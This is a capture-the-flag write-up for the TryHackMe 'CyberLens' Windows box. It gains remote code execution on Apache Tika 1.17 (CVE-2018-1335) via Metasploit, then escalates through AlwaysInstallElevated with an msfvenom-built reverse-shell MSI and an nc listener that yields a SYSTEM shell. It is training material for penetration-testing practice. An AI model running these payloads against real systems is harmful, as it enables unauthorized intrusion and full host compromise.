# CyberLens Writeup - TryHackMe

CyberLens is an easy level boot2root machine available on TryHackMe. This box is a Windows machine with a vulnerable web application. The goal is to exploit the web application to get a reverse shell and then escalate privileges to get the root flag.

### Table of Contents
1. [Enumeration](#enumeration)
2. [Web Application](#web-application)
3. [Apache Tika](#apache-tika)
4. [Exploitation](#exploitation)
5. [Privilege Escalation](#privilege-escalation)

## Enumeration

As I always do, start with a port scan to identify the open ports and services running on the target machine.

```bash
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?    syn-ack
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
61777/tcp open  http          syn-ack Jetty 8.y.z-SNAPSHOT
| http-methods: 
|   Supported Methods: POST GET PUT OPTIONS HEAD
|_  Potentially risky methods: PUT
|_http-title: Welcome to the Apache Tika 1.17 Server
|_http-cors: HEAD GET
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-26T13:24:02
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3604/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 39742/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15440/udp): CLEAN (Failed to receive data)
|   Check 4 (port 45802/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

From the scan, we can see that the target machine is running a web server on port 80 and 61777. Let's start by visiting the web server on port 80.

## Web Application

![CyberLens](https://cdn.sarperavci.com/4e94247f/2f6c81.png)

It's a simple metadata extraction tool. We can upload a file and it will extract the metadata from the file. However, that's not useful for us. So that's why I peeked at the other web server running on port 61777.

## Apache Tika

![Apache Tika](https://cdn.sarperavci.com/9c68b9ef/4246dc.png)

Apache Tika version 1.17 is running on this server. It's vulnerable to CVE-2018-1335, which allows remote code execution. Luckily, there is a Metasploit module available for this vulnerability.

## Exploitation

![Metasploit](https://cdn.sarperavci.com/67f4ab4f/ecf4f2.png)

Once the exploit is run, I got a meterpreter shell.


```bash
msf6 exploit(windows/http/apache_tika_jp2_jscript) > run

[*] Started reverse TCP handler on 10.9.1.193:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  16.19% done (15998/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  24.29% done (23997/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  32.39% done (31996/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  40.48% done (39995/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  48.58% done (47994/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  56.67% done (55993/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  64.77% done (63992/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  72.87% done (71991/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  80.96% done (79990/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  89.06% done (87989/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress -  97.16% done (95988/98798 bytes)
[*] Sending PUT request to 10.10.135.152:61777/meta
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Sending stage (176198 bytes) to 10.10.135.152
[*] Meterpreter session 1 opened (10.9.1.193:4444 -> 10.10.135.152:49862) at 2024-05-26 09:56:41 -0400

meterpreter > 
```

## Privilege Escalation

After getting the meterpreter shell, I downloaded `PrivescCheck.ps1` to automate the privilege escalation process.

```bash
meterpreter > cd %temp%
meterpreter > upload PrivescCheck.ps1
[*] Uploading  : /home/kali/Desktop/PrivescCheck.ps1 -> PrivescCheck.ps1
[*] Uploaded 161.87 KiB of 161.87 KiB (100.0%): /home/kali/Desktop/PrivescCheck.ps1 -> PrivescCheck.ps1
[*] Completed  : /home/kali/Desktop/PrivescCheck.ps1 -> PrivescCheck.ps1
```

After I run the script, I found that it's likely to escalate privileges using the `AlwaysInstallElevated` registry key.


```bash
????????????????????????????????????????????????????????????????
?                 ~~~ PrivescCheck Summary ~~~                 ?
????????????????????????????????????????????????????????????????
 TA0003 - Persistence
 - UEFI & Secure Boot ▒ Low
 TA0004 - Privilege Escalation
 - AlwaysInstallElevated ▒ High
 - Driver co-installers ▒ Low
 - Latest updates installed ▒ Medium
 TA0006 - Credential Access
 - LSA Protection ▒ Low
 - Credential Guard ▒ Low
 TA0008 - Lateral Movement
 - UAC settings ▒ Low
 - LAPS ▒ Medium
 ```

`AlwaysInstallElevated` allows non-administrative users to install .msi packages with elevated privileges.

I created a suspicious .msi package locally:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.1.193 LPORT=8282 -a x64 --platform Windows -f msi -o evil.msi
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: evil.msi

```

Then I uploaded the `evil.msi` file to the target machine and executed it.

```bash
meterpreter > shell
Process 3940 created.
Channel 6 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\CYBERL~1\AppData\Local\Temp\1>msiexec /quiet /qn /i evil.msi
```

After executing the .msi package, I got a reverse shell as `NT AUTHORITY\SYSTEM`.

```cmd
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 8282
listening on [any] 8282 ...
connect to [10.9.1.193] from (UNKNOWN) [10.10.68.65] 49843
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

What a fun box! I hope you enjoyed the writeup. Thanks for reading!




